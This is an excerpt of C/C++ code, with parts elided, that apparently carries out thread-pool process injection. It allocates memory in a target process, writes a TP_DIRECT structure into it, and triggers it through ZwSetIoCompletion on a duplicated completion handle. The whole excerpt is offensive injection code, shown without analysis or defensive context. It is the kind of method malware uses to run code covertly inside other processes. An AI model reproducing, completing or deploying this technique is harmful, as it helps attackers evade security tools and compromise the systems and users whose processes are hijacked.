...
int main(int argc, char* argv[])
{
	...
	PTP_DIRECT RemoteDirectAccess = (PTP_DIRECT)VirtualAllocEx(hTargetProcess, nullptr, sizeof(TP_DIRECT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (RemoteDirectAccess == nullptr) {
	...
	bResult = WriteProcessMemory(hTargetProcess, RemoteDirectAccess, &Direct, sizeof(TP_DIRECT), nullptr);
	if (bResult == 0x0) {
		printf("[-] WriteProcessMemory failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
	...
	status = ZwSetIoCompletion(hDuplicatedObject, RemoteDirectAccess, 0, 0, 0);
	if (status != 0x0) {
		printf("[-] ZwSetIoCompletion failed.\n");
		CloseHandle(hTargetProcess);
		CloseHandle(hDuplicatedObject);
		return 1;
	}
